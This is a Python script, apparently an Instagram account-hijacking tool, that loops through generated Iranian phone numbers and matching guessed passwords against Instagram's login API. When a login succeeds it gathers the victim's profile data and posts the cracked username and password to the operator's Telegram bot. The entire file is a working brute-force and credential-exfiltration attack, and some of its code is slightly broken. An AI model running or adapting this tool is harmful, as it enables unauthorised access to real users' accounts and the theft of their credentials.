import webbrowser
import os,sys,subprocess
        
subprocess.getoutput("pip install requests")
import requests,sys,os,time


Z =  '\033[1;31m'  #احمر
X =  '\033[1;33m' #اصفر
BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
Z = '\033[1;31m' #احمر
A = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
X = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
'\033[1;34m'
'\033[1;34m'


try:
    import os
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0
   


    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.1)
            
logo ='''
 
██░▀██████████████▀░██
█▌▒▒░████████████░▒▒▐█
█░▒▒▒░██████████░▒▒▒░█
▌░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▐
░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░
███▀▀▀██▄▒▒▒▒▒▒▒▄██▀▀▀██
██░░░▐█░▀█▒▒▒▒▒█▀░█▌░░░█
▐▌░░░▐▄▌░▐▌▒▒▒▐▌░▐▄▌░░▐▌
█░░░▐█▌░░▌▒▒▒▐░░▐█▌░░█
▒▀▄▄▄█▄▄▄▌░▄░▐▄▄▄█▄▄▀▒
░░░░░░░░░░└┴┘░░░░░░░░░
██▄▄░░░░░░░░░░░░░░▄▄██
████████▒▒▒▒▒▒████████
█▀░░███▒▒░░▒░░▒▀██████
█▒░███▒▒╖░░╥░░╓▒▐█████
█▒░▀▀▀░░║░░║░░║░░█████
██▄▄▄▄▀▀┴┴╚╧╧╝╧╧╝┴┴███
██████████████████████
𝙷𝙸 𝙸 𝙰𝙼 zaza🖤 ♡︎\@Vc62c
                                   '''   
print(logo)
print(Z+'='*50)


print(Z1+''*50)
ID = input(Z + ' 𝚃𝙳 :') 
tok = input(Z + ' 𝚃𝙾𝙺𝙸𝙽 :' ) 


def code_joo(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name = str(req_id['graphql']['user']['full_name'])
        id = str(req_id['graphql']['user']['id'])
        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following = str(req_id['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        dat = ree['data']

        GHOST = f"🖤✗\حسن علي تاج راسك🖤✗\n━━━━━━━✦✗✦━━━━━━━━\n 🎫𝙴𝙼𝙰𝙸𝙻✗ : {username}\n 😂𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳✗ : {password}\n 😂𝚄𝚂𝙴𝚁✗ : {userQ}\n 😂𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂✗ :  {followes}\n 😂𝙳𝙰𝚃𝙴✗ : {dat}\n━━━━━━━✦✗✦━━━━━━━━\n "@Vc62c
        
        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {GHOST} \n"
        i = requests.post(tlg)


url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing',  'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
sleep(1)
sleep(0.1)
user = '0987654321'
while True:
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+98939' + us
        password = '0939' + us
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username,
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            code_joo(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Z1+f"\r                 \n [+] HUNT : {zz} \n [+] GUESS : {aa}\n [+] USER : {username} \n [+] PASSWORD : {password} ",end='')
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print('''
                ''' )                          
            print(S +'='*50)
            print(C+f"\r \n {F}[+] 𝙷𝚄𝙽𝚃 : {zz} \n\n {Z}[+] 𝙶𝚄𝙴𝚂𝚂 : {aa}\n\n {S}[+] 𝚄𝚂𝙴𝚁 : {username} \n\n{S} [+] 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {password} ",end='')
            aa += 1
